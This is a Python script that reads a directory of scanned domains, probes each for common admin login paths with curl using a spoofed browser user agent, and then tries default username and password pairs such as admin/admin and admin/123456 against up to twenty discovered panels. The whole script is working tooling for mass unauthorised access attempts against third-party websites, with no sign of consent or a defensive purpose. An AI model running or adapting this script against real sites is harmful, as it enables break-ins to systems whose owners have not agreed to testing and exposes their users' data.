import json, glob, subprocess, socket, sys

# Load all sites
sites = []
for f in glob.glob('/tmp/scan_results/*.json'):
    d = json.load(open(f))
    sites.append(d)

print('Total sites:', len(sites))

# Phase 1: Find admin panels
admin_paths = [
    '/admin', '/admin/login', '/admin/index.php', '/login',
    '/manage', '/system', '/backend', '/admin.php', '/sys_login',
    '/index.php?c=admin', '/index.php?c=login', '/wp-admin',
    '/dede', '/adminer', '/cms/admin'
]

hits = []

for s in sites:
    domain = s['domain']
    for path in admin_paths:
        try:
            r = subprocess.run(['curl', '-sk', '--connect-timeout', '2', '--max-time', '4',
                '-L', 'http://' + domain + path, '-A', 'Mozilla/5.0',
                '-o', '/dev/null', '-w', '%{http_code} %{size_download}'],
                capture_output=True, text=True, timeout=6)
            parts = r.stdout.strip().split()
            if len(parts) >= 2:
                code, size = parts[0], parts[1]
                if code == '200' and int(size) > 500:
                    print(domain + path + ' -> ' + code + ' ' + size + 'B')
                    hits.append((domain, path))
        except:
            pass

print('Found', len(hits), 'admin pages')

# Phase 2: Try default creds on found panels
for domain, path in hits[:20]:
    try:
        # Get login page
        subprocess.run(['curl', '-sk', '-c', '/tmp/def_ck.txt',
            'http://' + domain + path, '-o', '/tmp/def_page.html'], timeout=5)
        
        content = open('/tmp/def_page.html', errors='ignore').read()
        
        # Determine login field names
        user_field = 'username'
        if 'email' in content.lower() or 'Email' in content:
            user_field = 'email'
        
        for pw in ['admin', '123456', 'admin123', 'admin888', 'password']:
            resp = subprocess.run(['curl', '-sk', '-b', '/tmp/def_ck.txt',
                '-L', 'http://' + domain + path, '-X', 'POST',
                '-d', user_field + '=admin&password=' + pw,
                '-A', 'Mozilla/5.0',
                '-o', '/dev/null', '-w', '%{size_download} %{url_effective}'],
                capture_output=True, text=True, timeout=8)
            print(domain + ' admin/' + pw + ': ' + resp.stdout.strip()[:60])
    except:
        pass
